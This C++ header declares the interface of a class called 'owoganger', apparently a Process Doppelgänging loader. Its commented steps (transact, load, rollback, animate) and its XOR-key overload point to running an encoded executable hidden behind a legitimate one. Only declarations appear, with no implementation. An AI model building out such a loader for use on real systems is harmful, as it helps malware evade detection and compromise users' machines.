#pragma once
#include "stdafx.h"
#include "typedefs.h"
#include <vector>
class owoganger
{
public:
	owoganger(std::string,std::string,DWORD);
	owoganger(std::string, std::string, DWORD, std::string); // xor overload
	~owoganger();

private:
	void transact(); // step 1
	void load(HANDLE, HANDLE); // step 2
	void rollback(HANDLE); // step 3
	void animate(HANDLE); // step 4
	PRTL_USER_PROCESS_PARAMETERS paramsInit();
	BOOL checkNtStatus(NTSTATUS *);
	void readFile();
	LPCWSTR source; //source executable path
	LPCWSTR destination; //destination executable path
	HMODULE ntdll;
	std::vector<BYTE> exeBuf;
	PRTL_USER_PROCESS_PARAMETERS procParams;
	DWORD SOURCE_FILE_FORMAT;
	std::string XOR_KEY; // xor key if file format in XOR



};